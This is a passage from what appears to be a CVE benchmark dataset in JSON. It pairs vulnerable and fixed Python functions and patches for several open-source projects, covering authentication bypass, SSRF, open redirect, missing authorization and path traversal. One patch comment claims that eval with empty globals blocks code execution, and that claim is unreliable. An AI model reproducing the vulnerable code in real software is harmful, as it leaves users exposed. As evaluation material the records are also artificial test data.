      # Skip elements starting with underscore\n            if element.tag.startswith(\"_\"):\n                return {}\n\n            field_info = cls.__fields__.get(element.tag)\n            is_verbatim = field_info and field_info.field_info.extra.get(\n                \"verbatim\", False\n            )\n\n            if is_verbatim:\n                # For code elements, preserve the content as is, including whitespace\n                content = element.text if element.text else \"\"\n                # Strip leading and trailing triple backticks if present,\n                # accounting for whitespace\n                return (\n                    content.strip().removeprefix(\"```\").removesuffix(\"```\").strip()\n                    if content.strip().startswith(\"```\")\n                    and content.strip().endswith(\"```\")\n                    else content\n                )\n            elif len(element) == 0:\n                # For non-code leaf elements, strip whitespace\n                return element.text.strip() if element.text else \"\"\n            else:\n                # For branch elements, handle potential lists or nested structures\n                children = [parse_element(child) for child in element]\n                if all(child.tag == element[0].tag for child in element):\n                    # If all children have the same tag, treat as a list\n                    return children\n                else:\n                    # Otherwise, treat as a dictionary\n                    result = {child.tag: parse_element(child) for child in element}\n                    # Check if this corresponds to a nested Pydantic model\n                    if field_info and issubclass(field_info.type_, BaseModel):\n                        return field_info.type_(**result)\n                    return result\n\n        result = parse_element(root)\n        if not isinstance(result, dict):\n            return None\n        # Filter out empty dictionaries from skipped underscore fields\n        return {k: v for k, v in result.items() if v != {}}"
      }
    ],
    "vul_patch": "--- a/langroid/agent/special/table_chat_agent.py\n+++ b/langroid/agent/special/table_chat_agent.py\n@@ -17,9 +17,11 @@\n         # Temporarily redirect standard output to our string-based I/O stream\n         sys.stdout = code_out\n \n-        # Evaluate the last line and get the result\n+        # Evaluate the last line and get the result;\n+        # SECURITY: eval only with empty globals and {\"df\": df} in locals to\n+        # prevent arbitrary Python code execution.\n         try:\n-            eval_result = pd.eval(exprn, local_dict=local_vars)\n+            eval_result = eval(exprn, {}, local_vars)\n         except Exception as e:\n             eval_result = f\"ERROR: {type(e)}: {e}\"\n \n\n--- a/langroid/agent/xml_tool_message.py\n+++ b/langroid/agent/xml_tool_message.py\n@@ -14,7 +14,17 @@\n         Raises:\n             etree.XMLSyntaxError: If the input string is not valid XML.\n         \"\"\"\n-        parser = etree.XMLParser(strip_cdata=False)\n+        # SECURITY: Initialize XMLParser with flags to prevent \n+        # XML External Entity (XXE), billion laughs, and external DTD attacks by \n+        # disabling entity resolution, DTD loading, and network access;\n+        # `strip_cdata=False` is needed to preserve\n+        # content within CDATA sections (e.g., for code).        \n+        parser = etree.XMLParser(\n+            strip_cdata=False,\n+            resolve_entities=False,\n+            load_dtd=False,\n+            no_network=True,\n+        )\n         root = etree.fromstring(formatted_string.encode(\"utf-8\"), parser=parser)\n \n         def parse_element(element: etree._Element) -> Any:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-36436",
    "cve_description": "OSU Open Source Lab VNCAuthProxy through 1.1.1 is affected by an vncap/vnc/protocol.py VNCServerAuthenticator authentication-bypass vulnerability that could allow a malicious actor to gain unauthorized access to a VNC session or to disconnect a legitimate user from a VNC session. A remote attacker with network access to the proxy server could leverage this vulnerability to connect to VNC servers protected by the proxy server without providing any authentication credentials. Exploitation of this issue requires that the proxy server is currently accepting connections for the target VNC server.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/osuosl/twisted_vncauthproxy",
    "patch_url": [
      "https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_305_1",
        "commit": "3dffdff",
        "file_path": "vncap/vnc/protocol.py",
        "start_line": 68,
        "end_line": 81,
        "snippet": "    def check_version(self, version):\n        \"\"\"\n        Determine the client's version and decide whether to continue the\n        handshake.\n        \"\"\"\n\n        if version == self.VERSION:\n            log.msg(\"Client version %s is valid\" % version.strip())\n            # Hardcoded: 2 security types: None and VNC Auth.\n            self.transport.write(\"\\x02\\x01\\x02\")\n            return self.select_security_type, 1\n        else:\n            log.err(\"Can't handle VNC version %r\" % version)\n            self.transport.loseConnection()"
      },
      {
        "id": "vul_py_305_2",
        "commit": "3dffdff",
        "file_path": "vncap/vnc/protocol.py",
        "start_line": 83,
        "end_line": 101,
        "snippet": "    def select_security_type(self, security_type):\n        \"\"\"\n        Choose the security type that the client wants.\n        \"\"\"\n\n        security_type = ord(security_type)\n\n        if security_type == 2:\n            # VNC authentication. Issue our challenge.\n            self.challenge = urandom(16)\n            self.transport.write(self.challenge)\n\n            return self.vnc_authentication_result, 16\n        elif security_type == 1:\n            # No authentication. Just move to the SecurityResult.\n            self.authenticated()\n        else:\n            log.err(\"Couldn't agree on an authentication scheme!\")\n            self.transport.loseConnection()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_305_1",
        "commit": "edc149af29242178091b2d6fcd42c3ef0851644b",
        "file_path": "vncap/vnc/protocol.py",
        "start_line": 68,
        "end_line": 81,
        "snippet": "    def check_version(self, version):\n        \"\"\"\n        Determine the client's version and decide whether to continue the\n        handshake.\n        \"\"\"\n\n        if version == self.VERSION:\n            log.msg(\"Client version %s is valid\" % version.strip())\n            # Hardcoded: 1 security type: VNC Auth.\n            self.transport.write(\"\\x01\\x02\")\n            return self.select_security_type, 1\n        else:\n            log.err(\"Can't handle VNC version %r\" % version)\n            self.transport.loseConnection()"
      },
      {
        "id": "fix_py_305_2",
        "commit": "edc149af29242178091b2d6fcd42c3ef0851644b",
        "file_path": "vncap/vnc/protocol.py",
        "start_line": 83,
        "end_line": 98,
        "snippet": "    def select_security_type(self, security_type):\n        \"\"\"\n        Choose the security type that the client wants.\n        \"\"\"\n\n        security_type = ord(security_type)\n\n        if security_type == 2:\n            # VNC authentication. Issue our challenge.\n            self.challenge = urandom(16)\n            self.transport.write(self.challenge)\n\n            return self.vnc_authentication_result, 16\n        else:\n            log.err(\"Couldn't agree on an authentication scheme!\")\n            self.transport.loseConnection()"
      }
    ],
    "vul_patch": "--- a/vncap/vnc/protocol.py\n+++ b/vncap/vnc/protocol.py\n@@ -6,8 +6,8 @@\n \n         if version == self.VERSION:\n             log.msg(\"Client version %s is valid\" % version.strip())\n-            # Hardcoded: 2 security types: None and VNC Auth.\n-            self.transport.write(\"\\x02\\x01\\x02\")\n+            # Hardcoded: 1 security type: VNC Auth.\n+            self.transport.write(\"\\x01\\x02\")\n             return self.select_security_type, 1\n         else:\n             log.err(\"Can't handle VNC version %r\" % version)\n\n--- a/vncap/vnc/protocol.py\n+++ b/vncap/vnc/protocol.py\n@@ -11,9 +11,6 @@\n             self.transport.write(self.challenge)\n \n             return self.vnc_authentication_result, 16\n-        elif security_type == 1:\n-            # No authentication. Just move to the SecurityResult.\n-            self.authenticated()\n         else:\n             log.err(\"Couldn't agree on an authentication scheme!\")\n             self.transport.loseConnection()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-36551",
    "cve_description": "A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/heartexlabs/label-studio",
    "patch_url": [
      "https://github.com/heartexlabs/label-studio/commit/501142cb815ac964b0c600c491885b67386870c2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_122_1",
        "commit": "ad29804",
        "file_path": "label_studio/data_import/uploader.py",
        "start_line": 143,
        "end_line": 202,
        "snippet": "def load_tasks(request, project):\n    \"\"\" Load tasks from different types of request.data / request.files\n    \"\"\"\n    file_upload_ids, found_formats, data_keys = [], [], set()\n    could_be_tasks_lists = False\n\n    # take tasks from request FILES\n    if len(request.FILES):\n        check_file_sizes_and_number(request.FILES)\n        for filename, file in request.FILES.items():\n            file_upload = create_file_upload(request, project, file)\n            if file_upload.format_could_be_tasks_list:\n                could_be_tasks_lists = True\n            file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    # take tasks from url address\n    elif 'application/x-www-form-urlencoded' in request.content_type:\n        # empty url\n        url = request.data.get('url')\n        if not url:\n            raise ValidationError('\"url\" is not found in request data')\n\n        # try to load json with task or tasks from url as string\n        json_data = str_to_json(url)\n        if json_data:\n            file_upload = create_file_upload(request, project, SimpleUploadedFile('inplace.json', url.encode()))\n            file_upload_ids.append(file_upload.id)\n            tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n            \n        # download file using url and read tasks from it\n        else:\n            if settings.SSRF_PROTECTION_ENABLED and url_is_local(url):\n                raise ImportFromLocalIPError\n            data_keys, found_formats, tasks, file_upload_ids = tasks_from_url(\n                file_upload_ids, project, request, url\n            )\n\n    # take one task from request DATA\n    elif 'application/json' in request.content_type and isinstance(request.data, dict):\n        tasks = [request.data]\n\n    # take many tasks from request DATA\n    elif 'application/json' in request.content_type and isinstance(request.data, list):\n        tasks = request.data\n\n    # incorrect data source\n    else:\n        raise ValidationError('load_tasks: No data found in DATA or in FILES')\n\n    # check is data root is list\n    if not isinstance(tasks, list):\n        raise ValidationError('load_tasks: Data root must be list')\n\n    # empty tasks error\n    if not tasks:\n        raise ValidationError('load_tasks: No tasks added')\n\n    check_max_task_number(tasks)\n    return tasks, file_upload_ids, could_be_tasks_lists, found_formats, list(data_keys)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_122_1",
        "commit": "501142c",
        "file_path": "label_studio/data_import/uploader.py",
        "start_line": 143,
        "end_line": 206,
        "snippet": "def load_tasks(request, project):\n    \"\"\" Load tasks from different types of request.data / request.files\n    \"\"\"\n    file_upload_ids, found_formats, data_keys = [], [], set()\n    could_be_tasks_lists = False\n\n    # take tasks from request FILES\n    if len(request.FILES):\n        check_file_sizes_and_number(request.FILES)\n        for filename, file in request.FILES.items():\n            file_upload = create_file_upload(request, project, file)\n            if file_upload.format_could_be_tasks_list:\n                could_be_tasks_lists = True\n            file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    # take tasks from url address\n    elif 'application/x-www-form-urlencoded' in request.content_type:\n        # empty url\n        url = request.data.get('url')\n        if not url:\n            raise ValidationError('\"url\" is not found in request data')\n\n        # try to load json with task or tasks from url as string\n        json_data = str_to_json(url)\n        if json_data:\n            file_upload = create_file_upload(request, project, SimpleUploadedFile('inplace.json', url.encode()))\n            file_upload_ids.append(file_upload.id)\n            tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n            \n        # download file using url and read tasks from it\n        else:\n            if settings.SSRF_PROTECTION_ENABLED and url_is_local(url):\n                raise ImportFromLocalIPError\n\n            if url.strip().startswith('file://'):\n                raise ValidationError('\"url\" is not valid')\n\n            data_keys, found_formats, tasks, file_upload_ids = tasks_from_url(\n                file_upload_ids, project, request, url\n            )\n\n    # take one task from request DATA\n    elif 'application/json' in request.content_type and isinstance(request.data, dict):\n        tasks = [request.data]\n\n    # take many tasks from request DATA\n    elif 'application/json' in request.content_type and isinstance(request.data, list):\n        tasks = request.data\n\n    # incorrect data source\n    else:\n        raise ValidationError('load_tasks: No data found in DATA or in FILES')\n\n    # check is data root is list\n    if not isinstance(tasks, list):\n        raise ValidationError('load_tasks: Data root must be list')\n\n    # empty tasks error\n    if not tasks:\n        raise ValidationError('load_tasks: No tasks added')\n\n    check_max_task_number(tasks)\n    return tasks, file_upload_ids, could_be_tasks_lists, found_formats, list(data_keys)"
      }
    ],
    "vul_patch": "--- a/label_studio/data_import/uploader.py\n+++ b/label_studio/data_import/uploader.py\n@@ -32,6 +32,10 @@\n         else:\n             if settings.SSRF_PROTECTION_ENABLED and url_is_local(url):\n                 raise ImportFromLocalIPError\n+\n+            if url.strip().startswith('file://'):\n+                raise ValidationError('\"url\" is not valid')\n+\n             data_keys, found_formats, tasks, file_upload_ids = tasks_from_url(\n                 file_upload_ids, project, request, url\n             )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-26232",
    "cve_description": "Jupyter Server before version 1.0.6 has an Open redirect vulnerability. A maliciously crafted link to a jupyter server could redirect the browser to a different website. All jupyter servers are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts. A link to your jupyter server may appear safe, but ultimately redirect to a spoofed server on the public internet.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/jupyter-server/jupyter_server",
    "patch_url": [
      "https://github.com/jupyter-server/jupyter_server/commit/3d83e49090289c431da253e2bdb8dc479cbcb157"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_112_1",
        "commit": "505140f",
        "file_path": "jupyter_server/base/handlers.py",
        "start_line": 778,
        "end_line": 781,
        "snippet": "    def get(self):\n        uri = self.request.path.rstrip(\"/\")\n        if uri:\n            self.redirect('?'.join((uri, self.request.query)))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_112_1",
        "commit": "3d83e49",
        "file_path": "jupyter_server/base/handlers.py",
        "start_line": 778,
        "end_line": 784,
        "snippet": "    def get(self):\n        path, *rest = self.request.uri.partition(\"?\")\n        # trim trailing *and* leading /\n        # to avoid misinterpreting repeated '//'\n        path = \"/\" + path.strip(\"/\")\n        new_uri = \"\".join([path, *rest])\n        self.redirect(new_uri)"
      }
    ],
    "vul_patch": "--- a/jupyter_server/base/handlers.py\n+++ b/jupyter_server/base/handlers.py\n@@ -1,4 +1,7 @@\n     def get(self):\n-        uri = self.request.path.rstrip(\"/\")\n-        if uri:\n-            self.redirect('?'.join((uri, self.request.query)))\n+        path, *rest = self.request.uri.partition(\"?\")\n+        # trim trailing *and* leading /\n+        # to avoid misinterpreting repeated '//'\n+        path = \"/\" + path.strip(\"/\")\n+        new_uri = \"\".join([path, *rest])\n+        self.redirect(new_uri)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-3987",
    "cve_description": "An improper access control vulnerability exists in janeczku/calibre-web. The affected version allows users without public shelf permissions to create public shelves. The vulnerability is due to the `create_shelf` method in `shelf.py` not verifying if the user has the necessary permissions to create a public shelf. This issue can lead to unauthorized actions being performed by users.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/janeczku/calibre-web",
    "patch_url": [
      "https://github.com/janeczku/calibre-web/commit/bcdc97641447965af486964537f3821f47b28874"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_39_1",
        "commit": "6aad937",
        "file_path": "cps/shelf.py",
        "start_line": 226,
        "end_line": 228,
        "snippet": "def create_shelf():\n    shelf = ub.Shelf()\n    return create_edit_shelf(shelf, page_title=_(u\"Create a Shelf\"), page=\"shelfcreate\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_39_1",
        "commit": "bcdc976",
        "file_path": "cps/shelf.py",
        "start_line": 226,
        "end_line": 232,
        "snippet": "def create_shelf():\n    if not current_user.role_edit_shelfs() and request.method == 'POST':\n        flash(_(u\"Sorry you are not allowed to create a public shelf\"), category=\"error\")\n        return redirect(url_for('web.index'))\n    else:\n        shelf = ub.Shelf()\n        return create_edit_shelf(shelf, page_title=_(u\"Create a Shelf\"), page=\"shelfcreate\")"
      }
    ],
    "vul_patch": "--- a/cps/shelf.py\n+++ b/cps/shelf.py\n@@ -1,3 +1,7 @@\n def create_shelf():\n-    shelf = ub.Shelf()\n-    return create_edit_shelf(shelf, page_title=_(u\"Create a Shelf\"), page=\"shelfcreate\")\n+    if not current_user.role_edit_shelfs() and request.method == 'POST':\n+        flash(_(u\"Sorry you are not allowed to create a public shelf\"), category=\"error\")\n+        return redirect(url_for('web.index'))\n+    else:\n+        shelf = ub.Shelf()\n+        return create_edit_shelf(shelf, page_title=_(u\"Create a Shelf\"), page=\"shelfcreate\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-3987:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/calibre-web\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-3987/bin/python  hand_test.py\n",
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-5982",
    "cve_description": "A path traversal vulnerability exists in the latest version of gaizhenbiao/chuanhuchatgpt. The vulnerability arises from unsanitized input handling in multiple features, including user upload, directory creation, and template loading. Specifically, the load_chat_history function in modules/models/base_model.py allows arbitrary file uploads, potentially leading to remote code execution (RCE). The get_history_names function in utils.py permits arbitrary directory creation. Additionally, the load_template function in utils.py can be exploited to leak the first column of CSV files. These issues stem from improper sanitization of user inputs concatenated with directory paths using os.path.join.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gaizhenbiao/chuanhuchatgpt",
    "patch_url": [
      "https://github.com/gaizhenbiao/chuanhuchatgpt/commit/952fc8c3cbacead858311747cddd4bedcb4721d7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_290_1",
        "commit": "868767e",
        "file_path": "modules/models/base_model.py",
        "start_line": 990,
        "end_line": 1100,
        "snippet": "    def load_chat_history(self, new_history_file_path=None):\n        logging.debug(f\"{self.user_name} \\u52a0\\u8f7d\\u5bf9\\u8bdd\\u5386\\u53f2\\u4e2d\\u2026\\u2026\")\n        if new_history_file_path is not None:\n            if type(new_history_file_path) != str:\n                # copy file from new_history_file_path.name to os.path.join(HISTORY_DIR, self.user_name)\n                new_history_file_path = new_history_file_path.name\n                shutil.copyfile(\n                    new_history_file_path,\n                    os.path.join(\n                        HISTORY_DIR,\n                        self.user_name,\n                        os.path.basename(new_history_file_path),\n                    ),\n                )\n                self.history_file_path = os.path.basename(new_history_file_path)\n            else:\n                self.history_file_path = new_history_file_path\n        try:\n            if self.history_file_path == os.path.basename(self.history_file_path):\n                history_file_path = os.path.join(\n                    HISTORY_DIR, self.user_name, self.history_file_path\n                )\n            else:\n                history_file_path = self.history_file_path\n            if not self.history_file_path.endswith(\".json\"):\n                history_file_path += \".json\"\n            with open(history_file_path, \"r\", encoding=\"utf-8\") as f:\n                saved_json = json.load(f)\n            try:\n                if type(saved_json[\"history\"][0]) == str:\n                    logging.info(\"\\u5386\\u53f2\\u8bb0\\u5f55\\u683c\\u5f0f\\u4e3a\\u65e7\\u7248\\uff0c\\u6b63\\u5728\\u8f6c\\u6362\\u2026\\u2026\")\n                    new_history = []\n                    for index, item in enumerate(saved_json[\"history\"]):\n                        if index % 2 == 0:\n                            new_history.append(construct_user(item))\n                        else:\n                            new_history.append(construct_assistant(item))\n                    saved_json[\"history\"] = new_history\n                    logging.info(new_history)\n            except:\n                pass\n            if len(saved_json[\"chatbot\"]) < len(saved_json[\"history\"]) // 2:\n                logging.info(\"Trimming corrupted history...\")\n                saved_json[\"history\"] = saved_json[\"history\"][\n                    -len(saved_json[\"chatbot\"]) :\n                ]\n                logging.info(f\"Trimmed history: {saved_json['history']}\")\n            # Sanitize chatbot\n            saved_json[\"chatbot\"] = remove_html_tags(saved_json[\"chatbot\"])\n            logging.debug(f\"{self.user_name} \\u52a0\\u8f7d\\u5bf9\\u8bdd\\u5386\\u53f2\\u5b8c\\u6bd5\")\n            self.history = saved_json[\"history\"]\n            self.single_turn = saved_json.get(\"single_turn\", self.single_turn)\n            self.temperature = saved_json.get(\"temperature\", self.temperature)\n            self.top_p = saved_json.get(\"top_p\", self.top_p)\n            self.n_choices = saved_json.get(\"n_choices\", self.n_choices)\n            self.stop_sequence = list(saved_json.get(\"stop_sequence\", self.stop_sequence))\n            self.token_upper_limit = saved_json.get(\n                \"token_upper_limit\", self.token_upper_limit\n            )\n            self.max_generation_token = saved_json.get(\n                \"max_generation_token\", self.max_generation_token\n            )\n            self.presence_penalty = saved_json.get(\n                \"presence_penalty\", self.presence_penalty\n            )\n            self.frequency_penalty = saved_json.get(\n                \"frequency_penalty\", self.frequency_penalty\n            )\n            self.logit_bias = saved_json.get(\"logit_bias\", self.logit_bias)\n            self.user_identifier = saved_json.get(\"user_identifier\", self.user_name)\n            self.metadata = saved_json.get(\"metadata\", self.metadata)\n            self.stream = saved_json.get(\"stream\", self.stream)\n            self.chatbot = saved_json[\"chatbot\"]\n            return (\n                os.path.basename(self.history_file_path)[:-5],\n                saved_json[\"system\"],\n                gr.update(value=saved_json[\"chatbot\"]),\n                self.single_turn,\n                self.temperature,\n                self.top_p,\n                self.n_choices,\n                \",\".join(self.stop_sequence),\n                self.token_upper_limit,\n                self.max_generation_token,\n                self.presence_penalty,\n                self.frequency_penalty,\n                self.logit_bias,\n                self.user_identifier,\n                self.stream\n            )\n        except:\n            # \\u6ca1\\u6709\\u5bf9\\u8bdd\\u5386\\u53f2\\u6216\\u8005\\u5bf9\\u8bdd\\u5386\\u53f2\\u89e3\\u6790\\u5931\\u8d25\n            logging.debug(f\"\\u6ca1\\u6709\\u627e\\u5230\\u5bf9\\u8bdd\\u5386\\u53f2\\u8bb0\\u5f55 {self.history_file_path}\")\n            self.reset()\n            return (\n                os.path.basename(self.history_file_path),\n                self.system_prompt,\n                gr.update(value=[]),\n                self.single_turn,\n                self.temperature,\n                self.top_p,\n                self.n_choices,\n                \",\".join(self.stop_sequence),\n                self.token_upper_limit,\n                self.max_generation_token,\n                self.presence_penalty,\n                self.frequency_penalty,\n                self.logit_bias,\n                self.user_identifier,\n                self.stream\n            )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_290_1",
        "commit": "952fc8c3cbacead858311747cddd4bedcb4721d7",
        "file_path": "modules/models/base_model.py",
        "start_line": 990,
        "end_line": 1105,
        "snippet": "    def load_chat_history(self, new_history_file_path=None):\n        logging.debug(f\"{self.user_name} \\u52a0\\u8f7d\\u5bf9\\u8bdd\\u5386\\u53f2\\u4e2d\\u2026\\u2026\")\n        if new_history_file_path is not None:\n            if type(new_history_file_path) != str:\n                # copy file from new_history_file_path.name to os.path.join(HISTORY_DIR, self.user_name)\n                new_history_file_path = new_history_file_path.name\n                target_path = os.path.join(HISTORY_DIR, self.user_name, new_history_file_path)\n                # Check if the file is in the history directory\n                assert os.path.realpath(new_history_file_path).startswith(os.path.realpath(HISTORY_DIR))\n                assert os.path.realpath(target_path).startswith(os.path.realpath(HISTORY_DIR))\n                assert self.user_name in [i[0] for i in auth_list]\n                shutil.copyfile(\n                    new_history_file_path,\n                    os.path.join(\n                        HISTORY_DIR,\n                        self.user_name,\n                        os.path.basename(new_history_file_path),\n                    ),\n                )\n                self.history_file_path = os.path.basename(new_history_file_path)\n            else:\n                self.history_file_path = new_history_file_path\n        try:\n            if self.history_file_path == os.path.basename(self.history_file_path):\n                history_file_path = os.path.join(\n                    HISTORY_DIR, self.user_name, self.history_file_path\n                )\n            else:\n                history_file_path = self.history_file_path\n            if not self.history_file_path.endswith(\".json\"):\n                history_file_path += \".json\"\n            with open(history_file_path, \"r\", encoding=\"utf-8\") as f:\n                saved_json = json.load(f)\n            try:\n                if type(saved_json[\"history\"][0]) == str:\n                    logging.info(\"\\u5386\\u53f2\\u8bb0\\u5f55\\u683c\\u5f0f\\u4e3a\\u65e7\\u7248\\uff0c\\u6b63\\u5728\\u8f6c\\u6362\\u2026\\u2026\")\n                    new_history = []\n                    for index, item in enumerate(saved_json[\"history\"]):\n                        if index % 2 == 0:\n                            new_history.append(construct_user(item))\n                        else:\n                            new_history.append(construct_assistant(item))\n                    saved_json[\"history\"] = new_history\n                    logging.info(new_history)\n            except:\n                pass\n            if len(saved_json[\"chatbot\"]) < len(saved_json[\"history\"]) // 2:\n                logging.info(\"Trimming corrupted history...\")\n                saved_json[\"history\"] = saved_json[\"history\"][\n                    -len(saved_json[\"chatbot\"]) :\n                ]\n                logging.info(f\"Trimmed history: {saved_json['history']}\")\n            # Sanitize chatbot\n            saved_json[\"chatbot\"] = remove_html_tags(saved_json[\"chatbot\"])\n            logging.debug(f\"{self.user_name} \\u52a0\\u8f7d\\u5bf9\\u8bdd\\u5386\\u53f2\\u5b8c\\u6bd5\")\n            self.history = saved_json[\"history\"]\n            self.single_turn = saved_json.get(\"single_turn\", self.single_turn)\n            self.temperature = saved_json.get(\"temperature\", self.temperature)\n            self.top_p = saved_json.get(\"top_p\", self.top_p)\n            self.n_choices = saved_json.get(\"n_choices\", self.n_choices)\n            self.stop_sequence = list(saved_json.get(\"stop_sequence\", self.stop_sequence))\n            self.token_upper_limit = saved_json.get(\n                \"token_upper_limit\", self.token_upper_limit\n            )\n            self.max_generation_token = saved_json.get(\n                \"max_generation_token\", self.max_generation_token\n            )\n            self.presence_penalty = saved_json.get(\n                \"presence_penalty\", self.presence_penalty\n            )\n            self.frequency_penalty = saved_json.get(\n                \"frequency_penalty\", self.frequency_penalty\n            )\n            self.logit_bias = saved_json.get(\"logit_bias\", self.logit_bias)\n            self.user_identifier = saved_json.get(\"user_identifier\", self.user_name)\n            self.metadata = saved_json.get(\"metadata\", self.metadata)\n            self.stream = saved_json.get(\"stream\", self.stream)\n            self.chatbot = saved_json[\"chatbot\"]\n            return (\n                os.path.basename(self.history_file_path)[:-5],\n                saved_json[\"system\"],\n                gr.update(value=saved_json[\"chatbot\"]),\n                self.single_turn,\n                self.temperature,\n                self.top_p,\n                self.n_choices,\n                \",\".join(self.stop_sequence),\n                self.token_upper_limit,\n                self.max_generation_token,\n                self.presence_penalty,\n                self.frequency_penalty,\n                self.logit_bias,\n                self.user_identifier,\n                self.stream\n            )\n        except:\n            # \\u6ca1\\u6709\\u5bf9\\u8bdd\\u5386\\u53f2\\u6216\\u8005\\u5bf9\\u8bdd\\u5386\\u53f2\\u89e3\\u6790\\u5931\\u8d25\n            logging.debug(f\"\\u6ca1\\u6709\\u627e\\u5230\\u5bf9\\u8bdd\\u5386\\u53f2\\u8bb0\\u5f55 {self.history_file_path}\")\n            self.reset()\n            return (\n                os.path.basename(self.history_file_path),\n                self.system_prompt,\n                gr.update(value=[]),\n                self.single_turn,\n                self.temperature,\n                self.top_p,\n                self.n_choices,\n                \",\".join(self.stop_sequence),\n                self.token_upper_limit,\n                self.max_generation_token,\n                self.presence_penalty,\n                self.frequency_penalty,\n                self.logit_bias,\n                self.user_identifier,\n                self.stream\n            )"
      }
    ],
    "vul_patch": "--- a/modules/models/base_model.py\n+++ b/modules/models/base_model.py\n@@ -4,6 +4,11 @@\n             if type(new_history_file_path) != str:\n                 # copy file from new_history_file_path.name to os.path.join(HISTORY_DIR, self.user_name)\n                 new_history_file_path = new_history_file_path.name\n+                target_path = os.path.join(HISTORY_DIR, self.user_name, new_history_file_path)\n+                # Check if the file is in the history directory\n+                assert os.path.realpath(new_history_file_path).startswith(os.path.realpath(HISTORY_DIR))\n+                assert os.path.realpath(target_path).startswith(os.path.realpath(HISTORY_DIR))\n+                assert self.user_name in [i[0] for i in auth_list]\n                 shutil.copyfile(\n                     new_history_file_path,\n                     os.path.join(\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-0896",
    "cve_description": "Zulip Server 1.5.1 and below suffer from an error in the implementation of the invite_by_admins_only setting in the Zulip group chat application server that allowed an authenticated user to invite other users to join a Zulip organization even if the organization was configured to prevent this.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/1f48fa27672170bba3b9a97384905bb04c18761b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_201_1",
        "commit": "db9918f",
        "file_path": "zerver/views/invite.py",
        "start_line": 22,
        "end_line": 56,
        "snippet": "def json_invite_users(request, user_profile,\n                      invitee_emails_raw=REQ(\"invitee_emails\"),\n                      body=REQ(\"custom_body\", default=None)):\n    # type: (HttpRequest, UserProfile, str, Optional[str]) -> HttpResponse\n    if not invitee_emails_raw:\n        return json_error(_(\"You must specify at least one email address.\"))\n    if body == '':\n        body = None\n\n    invitee_emails = get_invitee_emails_set(invitee_emails_raw)\n\n    stream_names = request.POST.getlist('stream')\n    if not stream_names:\n        return json_error(_(\"You must specify at least one stream for invitees to join.\"))\n\n    # We unconditionally sub you to the notifications stream if it\n    # exists and is public.\n    notifications_stream = user_profile.realm.notifications_stream  # type: Optional[Stream]\n    if notifications_stream and not notifications_stream.invite_only:\n        stream_names.append(notifications_stream.name)\n\n    streams = []  # type: List[Stream]\n    for stream_name in stream_names:\n        try:\n            (stream, recipient, sub) = access_stream_by_name(user_profile, stream_name)\n        except JsonableError:\n            return json_error(_(\"Stream does not exist: %s. No invites were sent.\") % (stream_name,))\n        streams.append(stream)\n\n    ret_error, error_data = do_invite_users(user_profile, invitee_emails, streams, body)\n\n  